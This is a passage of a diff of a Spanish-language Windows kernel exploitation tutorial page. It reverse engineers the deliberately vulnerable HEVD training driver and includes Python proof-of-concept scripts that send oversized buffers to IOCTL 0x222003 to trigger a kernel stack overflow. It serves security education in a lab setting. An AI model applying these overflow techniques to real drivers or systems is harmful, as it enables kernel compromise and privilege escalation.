+    
+</h2>
 <p>Si cargamos <code>HEVD.sys</code> adentro de ghidra nosotros podemos ver el <code>entry point</code> de el aparato en realidad comienza en <code>DriverEntry()</code>. Esta función es la primera rutina llamado cuando el aparato esta cargado y tiene la responsabilidad de inicializando el aparato.</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/entry-ghidra.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/entry-ghidra.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Si entramos en esta función, todo se vuelve más claro.</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/DriverEntry.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/DriverEntry.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Usemos WinDbg para ver esto, encienda y apague la máquina y pon un pausa en en el punto de entrada
 antes que el aparato este cargado. Deberías yegar al pausa.</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/break_entry.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/break_entry.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Si continúas a desmontar desde aqi (<code>u</code>), eventualmente deberías ver una yamada a <code>IoCreateSymbolicLink</code>.</p>
 <p>Esta función esta responsable de crear el enlace simbólico que nosotras podemos llamar de Userland.</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/IoCreateSymLink.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/IoCreateSymLink.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Si imprimimos el primer argumento, podemos ver el nombre del enlace simbólico. En este caso va ser <code>HackSysExtremeVulnerableDriver</code>.</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/arg1_create.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/arg1_create.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Nosotras podemos ignorar <code>\\DosDevices</code> este es un espacio especial de nombre que Windows usa para el aparato. Para interactuar con él vamos usar <code>\\.\HackSysExtremeVulnerableDriver</code>, usamos <code>\\.\</code> porque esto es en el espacio &ldquo;Win32 device namespace&rdquo; o &ldquo;raw devive namespace&rdquo; que podemos usar desde userland. Aunque no necesitábamos pasar por esto, quería ver qué argumentos se pasarían a la función cuando creando un enlace simbólico.</p>
 <p>Entonces, ¿cómo enviamos información a HEVD? Como mencioné anteriormente, vamos usar <code>DeviceIoControl</code>.</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/deviceiocontrol.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/deviceiocontrol.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Lo principal en lo que queremos concentrarnos es el <code>dwIoControlCode</code></p>
 <p>Esto sera la operación que nosotros queremos el aprato que ejecute. Estos operacións o solicitudes son mandados al aparato por un I/O paquete también conocido como <code>IRPs</code>.</p>
 <p>Mirando la descompilación en Ghidra en <code>línea 31</code> miramos que <code>param_1-&gt;MajorFunction[0xe]</code> esta establecido con <code>IrpDeviceIoCtlHandler</code>. Por qué? Si miramos MSDN vemos la definición de estructura para este objeto en particular (__DRIVER_OBJECT).</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/DRIVER_OBJECT.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/DRIVER_OBJECT.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>A poner esto indica que IrpDeviceIoCtlHandler será la &ldquo;función&rdquo; que controla cómo interactuar con el aprato. Esto lo sabemos por el &ldquo;IRP Major Function Code 0xE&rdquo; (Mira esto como la función principal &ldquo;main&rdquo;):</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/irp_codes.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/irp_codes.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Si abres <code>IrpDeviceIoCtlHandler</code> sobre Ghidra se nos presenta la descompilación de la función. Aquí vemos que HEVD usa un &ldquo;switch&rdquo; para manejar nuestro mensajes de I/O.</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/codes.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/codes.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Con eso, tenemos todo lo que necesitamos para comenzar Exploit Development.</p>
-<h1 id="explotación-de-un-stack-overflow-windows-7---x86">Explotación de un &ldquo;Stack Overflow&rdquo; (Windows 7 - x86)</h1>
+
+
+<h1 class="relative group">Explotación de un &ldquo;Stack Overflow&rdquo; (Windows 7 - x86) 
+    <div id="explotaci%C3%B3n-de-un-stack-overflow-windows-7---x86" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#explotaci%C3%B3n-de-un-stack-overflow-windows-7---x86" aria-label="Anchor">#</a>
+    </span>        
+    
+</h1>
 <p>Para facilitar las cosas, ¿por qué no empezar con una vulnerabilidad tradicional? Un &ldquo;buffer overflow&rdquo;. Para ser las cosas mas facil tambien vamos usar <code>python</code>. Sin embargo, tenga en cuenta que más adelante en esta serie vamos usar <code>C</code> y tal vez <code>C++</code>.</p>
-<h2 id="identificando-la-vulnerabilidad">Identificando la Vulnerabilidad</h2>
+
+
+<h2 class="relative group">Identificando la Vulnerabilidad 
+    <div id="identificando-la-vulnerabilidad" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#identificando-la-vulnerabilidad" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
 <p>Ya que tenemos símbolos ingeniería inversa será facil. Dentro <em>IrpDeviceIoCtlHandler</em> podemos ver el &ldquo;stack overflow&rdquo; puede ser activado a través de el codigo I/O <strong>0x222003</strong>.</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/code_7.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/code_7.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Si entramos a la función <em>BufferOverflowStackIoctlHandler</em>.</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/overflow_7.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/overflow_7.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Hacemos una yamada a <em>TriggerBufferOverflowStack</em>.</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/memcpy_7.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/memcpy_7.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Hagamos nuestro prueba de concepto (PoC) para ver que pasa cuando entramos en esta función.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>GENERIC_READ          <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x80000000</span>
-</span></span><span style="display:flex;"><span>GENERIC_WRITE         <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40000000</span>
-</span></span><span style="display:flex;"><span>OPEN_EXISTING         <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000003</span>
-</span></span><span style="display:flex;"><span>FILE_ATTRIBUTE_NORMAL <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000080</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>NULL <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  kernel32 <span style="color:#f92672">=</span> windll<span style="color:#f92672">.</span>kernel32
-</span></span><span style="display:flex;"><span>  hHEVD <span style="color:#f92672">=</span> kernel32<span style="color:#f92672">.</span>CreateFileA(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>,
-</span></span><span style="display:flex;"><span>                               (GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE),
-</span></span><span style="display:flex;"><span>                               <span style="color:#ae81ff">0x00</span>,
-</span></span><span style="display:flex;"><span>                               NULL,
-</span></span><span style="display:flex;"><span>                               OPEN_EXISTING,
-</span></span><span style="display:flex;"><span>                               FILE_ATTRIBUTE_NORMAL,
-</span></span><span style="display:flex;"><span>                               NULL)
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>    exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  buffer <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;wetw0rk&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;[*] Calling control code 0x222003&#34;</span>)
-</span></span><span style="display:flex;"><span>  kernel32<span style="color:#f92672">.</span>DeviceIoControl(hHEVD,
-</span></span><span style="display:flex;"><span>                           <span style="color:#ae81ff">0x222003</span>,
-</span></span><span style="display:flex;"><span>                           buffer,
-</span></span><span style="display:flex;"><span>                           len(buffer),
-</span></span><span style="display:flex;"><span>                           NULL,
-</span></span><span style="display:flex;"><span>                           <span style="color:#ae81ff">0x00</span>,
-</span></span><span style="display:flex;"><span>                           byref(c_ulong()),
-</span></span><span style="display:flex;"><span>                           NULL)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>main()
-</span></span></code></pre></div><h2 id="entendiendo-bufferoverflowstackioctlhandler">Entendiendo BufferOverflowStackIoctlHandler</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">GENERIC_READ</span>          <span class="o">=</span> <span class="mh">0x80000000</span>
+</span></span><span class="line"><span class="cl"><span class="n">GENERIC_WRITE</span>         <span class="o">=</span> <span class="mh">0x40000000</span>
+</span></span><span class="line"><span class="cl"><span class="n">OPEN_EXISTING</span>         <span class="o">=</span> <span class="mh">0x00000003</span>
+</span></span><span class="line"><span class="cl"><span class="n">FILE_ATTRIBUTE_NORMAL</span> <span class="o">=</span> <span class="mh">0x00000080</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">NULL</span> <span class="o">=</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">kernel32</span> <span class="o">=</span> <span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span>
+</span></span><span class="line"><span class="cl">  <span class="n">hHEVD</span> <span class="o">=</span> <span class="n">kernel32</span><span class="o">.</span><span class="n">CreateFileA</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\\\\</span><span class="s2">.</span><span class="se">\\</span><span class="s2">HackSysExtremeVulnerableDriver&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                               <span class="p">(</span><span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                               <span class="mh">0x00</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                               <span class="n">NULL</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                               <span class="n">OPEN_EXISTING</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                               <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                               <span class="n">NULL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">hHEVD</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">buffer</span> <span class="o">=</span> <span class="s2">&#34;wetw0rk&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Calling control code 0x222003&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="n">kernel32</span><span class="o">.</span><span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hHEVD</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                           <span class="mh">0x222003</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                           <span class="n">buffer</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                           <span class="nb">len</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">                           <span class="n">NULL</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                           <span class="mh">0x00</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                           <span class="n">byref</span><span class="p">(</span><span class="n">c_ulong</span><span class="p">()),</span>
+</span></span><span class="line"><span class="cl">                           <span class="n">NULL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></div>
+
+<h2 class="relative group">Entendiendo BufferOverflowStackIoctlHandler 
+    <div id="entendiendo-bufferoverflowstackioctlhandler" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#entendiendo-bufferoverflowstackioctlhandler" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
 <p>Establecer una pausa en <em>BufferOverflowStackIoctlHandler</em>.</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/bu_bof_func_7.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/bu_bof_func_7.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Intentemos ver qué se pasa a esta función, podemos empesar bajando el &ldquo;stack frame&rdquo;.</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/stack_frame_7.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/stack_frame_7.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Mirando <em>BufferOverflowStackIoctlHandler</em> dentro Ghidra nos dice que estos parámetros son de tipo <em>_IRP</em> y <em>_IO_STACK_LOCATION</em> (también vimos esto en el &ldquo;stack frame&rdquo; con WinDbg).</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/overflow_7.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/overflow_7.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Sin embargo, en realidad sólo estamos usando <em>param_2</em> de el tipo <em>_IO_STACK_LOCATION</em>.</p>
-<p>Podemos encontrar la definición de esta estructura usando la documentación de <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_io_stack_location">MS</a>, sin embargo es largo, entonces solo lo relevante para nosotros esta enseñado.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _IO_STACK_LOCATION {
-</span></span><span style="display:flex;"><span>  UCHAR                  MajorFunction;
-</span></span><span style="display:flex;"><span>  UCHAR                  MinorFunction;
-</span></span><span style="display:flex;"><span>  UCHAR                  Flags;
-</span></span><span style="display:flex;"><span>  UCHAR                  Control;
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">union</span> {
-</span></span><span style="display:flex;"><span>...
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> {
-</span></span><span style="display:flex;"><span>      ULONG                   OutputBufferLength;
-</span></span><span style="display:flex;"><span>      ULONG POINTER_ALIGNMENT InputBufferLength;
-</span></span><span style="display:flex;"><span>      ULONG POINTER_ALIGNMENT FsControlCode;
-</span></span><span style="display:flex;"><span>      PVOID                   Type3InputBuffer;
-</span></span><span style="display:flex;"><span>    } FileSystemControl;
-</span></span><span style="display:flex;"><span>...
-</span></span><span style="display:flex;"><span>  } Parameters;
-</span></span><span style="display:flex;"><span>  PDEVICE_OBJECT         DeviceObject;
-</span></span><span style="display:flex;"><span>  PFILE_OBJECT           FileObject;
-</span></span><span style="display:flex;"><span>  PIO_COMPLETION_ROUTINE CompletionRoutine;
-</span></span><span style="display:flex;"><span>  PVOID                  Context;
-</span></span><span style="display:flex;"><span>} IO_STACK_LOCATION, <span style="color:#f92672">*</span>PIO_STACK_LOCATION;
+<p>Podemos encontrar la definición de esta estructura usando la documentación de <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_io_stack_location" target="_blank">MS</a>, sin embargo es largo, entonces solo lo relevante para nosotros esta enseñado.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_IO_STACK_LOCATION</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">UCHAR</span>                  <span class="n">MajorFunction</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">UCHAR</span>                  <span class="n">MinorFunction</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">UCHAR</span>                  <span class="n">Flags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">UCHAR</span>                  <span class="n">Control</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">union</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="p">...</span>
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">ULONG</span>                   <span class="n">OutputBufferLength</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">ULONG</span> <span class="n">POINTER_ALIGNMENT</span> <span class="n">InputBufferLength</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">ULONG</span> <span class="n">POINTER_ALIGNMENT</span> <span class="n">FsControlCode</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">PVOID</span>                   <span class="n">Type3InputBuffer</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="n">FileSystemControl</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">...</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="n">Parameters</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">PDEVICE_OBJECT</span>         <span class="n">DeviceObject</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">PFILE_OBJECT</span>           <span class="n">FileObject</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">PIO_COMPLETION_ROUTINE</span> <span class="n">CompletionRoutine</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">PVOID</span>                  <span class="n">Context</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">IO_STACK_LOCATION</span><span class="p">,</span> <span class="o">*</span><span class="n">PIO_STACK_LOCATION</span><span class="p">;</span>
 </span></span></code></pre></div><p>Si miramos esto en WinDbg, miramos que <strong>(param_2-&gt;Parameters).FileSystemControl.Type3InputBuffer</strong> es el puntero a nuestro porción de memoria (&ldquo;buffer&rdquo;).</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/type3inputbuffer_7.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/type3inputbuffer_7.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Entonces, cuando entramos a <em>TriggerBufferOverflowStack</em>, podemos estar seguros de que nuestra información esta pasado como <em>param_1</em>.</p>
-<h2 id="entendiendo-triggerbufferoverflowstack">Entendiendo TriggerBufferOverflowStack</h2>
+
+
+<h2 class="relative group">Entendiendo TriggerBufferOverflowStack 
+    <div id="entendiendo-triggerbufferoverflowstack" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#entendiendo-triggerbufferoverflowstack" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
 <p>Ahora que entendimos que <em>param_1</em> de <em>TriggerBufferOverflowStack</em> contiene nuestra memoria, la explotación parece fácil</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/memcpy_7.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/memcpy_7.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Simplemente tenemos que mandar mas de 2060 &ldquo;bytes&rdquo; y deberíamos tener curropción de la memoria! Agregar los cambios al PoC y mando lo!</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>GENERIC_READ          <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x80000000</span>
-</span></span><span style="display:flex;"><span>GENERIC_WRITE         <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40000000</span>
-</span></span><span style="display:flex;"><span>OPEN_EXISTING         <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000003</span>
-</span></span><span style="display:flex;"><span>FILE_ATTRIBUTE_NORMAL <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000080</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>NULL <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  kernel32 <span style="color:#f92672">=</span> windll<span style="color:#f92672">.</span>kernel32
-</span></span><span style="display:flex;"><span>  hHEVD <span style="color:#f92672">=</span> kernel32<span style="color:#f92672">.</span>CreateFileA(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>,
-</span></span><span style="display:flex;"><span>                               (GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE),
-</span></span><span style="display:flex;"><span>                               <span style="color:#ae81ff">0x00</span>,
-</span></span><span style="display:flex;"><span>                               NULL,
-</span></span><span style="display:flex;"><span>                               OPEN_EXISTING,
-</span></span><span style="display:flex;"><span>                               FILE_ATTRIBUTE_NORMAL,
-</span></span><span style="display:flex;"><span>                               NULL)
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>    exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  buffer <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">3000</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;[*] Calling control code 0x222003&#34;</span>)
-</span></span><span style="display:flex;"><span>  kernel32<span style="color:#f92672">.</span>DeviceIoControl(hHEVD,
-</span></span><span style="display:flex;"><span>                           <span style="color:#ae81ff">0x222003</span>,
-</span></span><span style="display:flex;"><span>                           buffer,
-</span></span><span style="display:flex;"><span>                           len(buffer),
-</span></span><span style="display:flex;"><span>                           NULL,
-</span></span><span style="display:flex;"><span>                           <span style="color:#ae81ff">0x00</span>,
-</span></span><span style="display:flex;"><span>                           byref(c_ulong()),
-</span></span><span style="display:flex;"><span>                           NULL)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>main()
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">GENERIC_READ</span>          <span class="o">=</span> <span class="mh">0x80000000</span>
+</span></span><span class="line"><span class="cl"><span class="n">GENERIC_WRITE</span>         <span class="o">=</span> <span class="mh">0x40000000</span>
+</span></span><span class="line"><span class="cl"><span class="n">OPEN_EXISTING</span>         <span class="o">=</span> <span class="mh">0x00000003</span>
+</span></span><span class="line"><span class="cl"><span class="n">FILE_ATTRIBUTE_NORMAL</span> <span class="o">=</span> <span class="mh">0x00000080</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">NULL</span> <span class="o">=</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">kernel32</span> <span class="o">=</span> <span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span>
